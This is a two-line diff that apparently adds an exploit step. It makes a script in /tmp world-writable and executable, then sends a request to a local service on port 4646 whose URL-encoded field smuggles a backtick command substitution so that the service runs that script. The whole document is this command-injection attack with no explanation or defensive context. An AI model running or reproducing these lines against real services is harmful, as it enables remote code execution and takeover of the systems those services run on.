@@ -1,0 +1,2 @@
+chmod 777 /tmp/SCRIPT
+curl localhost:4646 --data-urlencode "y=a&x=\`/*/SCRIPT\`"
